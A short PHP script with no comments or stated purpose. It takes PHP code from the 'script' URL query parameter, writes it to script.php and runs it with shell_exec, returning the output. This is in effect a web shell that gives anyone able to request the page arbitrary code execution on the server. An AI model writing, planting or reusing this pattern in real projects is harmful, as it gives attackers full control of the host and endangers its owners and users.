<?php

	require_once 'file_lib.php';

	$php_content = $_GET['script'];

	write_file('script.php', $php_content);

	echo shell_exec('php script.php');

?>